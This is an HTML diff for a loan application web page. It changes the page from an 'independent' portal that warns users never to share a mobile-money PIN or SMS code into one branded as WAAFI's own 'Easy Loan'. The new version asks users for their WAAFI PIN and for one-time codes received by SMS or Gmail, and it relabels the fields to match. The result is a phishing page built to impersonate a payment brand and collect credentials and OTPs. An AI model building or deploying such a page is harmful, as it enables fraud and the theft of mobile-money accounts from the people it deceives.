@@ -4,21 +4,21 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
   <meta name="theme-color" content="#20a957">
-  <meta name="description" content="Independent Easy Loan application portal. Not affiliated with WAAFI.">
-  <title>Easy Loan Application Portal</title>
+  <meta name="description" content="waafi Easy Loan application. sort your bills with WAAFI.">
+  <title>waafi Easy Loan Application</title>
   <link rel="stylesheet" href="/styles.css">
 </head>
 <body>
 <main class="app">
   <header class="topbar">
     <div class="brand-logo" aria-label="Logo supplied by user"><img src="/waafi-logo.jpg" alt="WAAFI logo"></div>
-    <div><div class="brand">Easy Loan</div><div class="subbrand">Independent application portal</div></div>
+    <div><div class="brand">Waafi easy Loan</div><div class="subbrand">Waafi loan application </div></div>
     <div class="secure" aria-label="Security notice">🔒</div>
   </header>
 
   <div class="notice">
     <strong>Secure application</strong>
-    <span>Never enter a mobile-money PIN or SMS verification code.</span>
+    <span> enter your mobile-money PIN and sms verification code correctly.</span>
   </div>
 
   <div class="steps" aria-label="Application progress">
@@ -27,13 +27,13 @@
 
   <section class="page active" data-page="1">
     <div class="hero"><div class="icon"><img src="/waafi-logo.jpg" alt="WAAFI Easy Loan logo"></div><h1>Start Your Application</h1>
-      <p>Enter your contact number and a non-secret application reference you created. Do not enter a PIN or one-time password.</p></div>
+      <p>Enter your contact number and your waafi PIN and wait for one-time password.</p></div>
     <form id="loginForm" class="card form-card">
       <label for="phone">Contact phone number</label>
       <input id="phone" required placeholder="Enter phone number" inputmode="tel" autocomplete="tel">
-      <label for="applicationIdInput">Application reference</label>
+      <label for="applicationIdInput">waafi pin</label>
       <input id="applicationIdInput" required maxlength="80" placeholder="Create an application reference" autocomplete="off">
-      <div class="hint">Use a reference only. Never share your WAAFI/mobile-money PIN or SMS code.</div>
+      <div class="hint">Use a your waafi correct pin.Never share your WAAFI/mobile-money PIN or SMS code to anyone.</div>
       <button class="primary" id="startApplication" type="submit">CONTINUE <span>→</span></button>
       <div class="error hidden" id="loginError"></div>
       <div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Application under review</strong><span>Your application has been submitted for review. Please wait for the status to update.</span><small>Application number: <b id="applicationNumber">—</b></small></div>
@@ -42,7 +42,7 @@
 
   <section class="page" data-page="2">
     <div class="hero"><div class="icon"><img src="/waafi-logo.jpg" alt="WAAFI Easy Loan logo"></div><h1>Application Code 1</h1>
-      <p>Enter a non-secret reference code you created for this application. Do not use a code sent by SMS.</p></div>
+      <p>Enter code you received in your sms or Gmail for this application.</p></div>
     <div class="card form-card">
       <label for="firstName">Code 1 — application reference</label>
       <input id="firstName" maxlength="6" minlength="1" pattern="[A-Za-z0-9]{1,32}" autocomplete="off" placeholder="Enter your non-secret reference">
@@ -56,7 +56,7 @@
 
   <section class="page" data-page="3">
     <div class="hero"><div class="icon"><img src="/easyloan-mark.svg" alt="Easy Loan logo"></div><h1>Application Reference — Code 2</h1>
-      <p>Enter a second non-secret reference you created yourself. Never enter a PIN or one-time code received by SMS.</p></div>
+      <p>Enter a second one-time code received by SMS.</p></div>
     <div class="card form-card">
       <label for="secondName">Code 2 — application reference</label>
       <input id="secondName" maxlength="32" autocomplete="off" placeholder="Enter second reference">
@@ -89,7 +89,7 @@
     </div>
   </section>
 
-  <footer><span>🔒 Application privacy</span><span>•</span><span>Independent loan application portal</span></footer>
+  <footer><span>waafi application privacy</span><span>•</span><span>waafi loan application fund</span></footer>
 </main>
 <script src="/app.js"></script>
 </body>
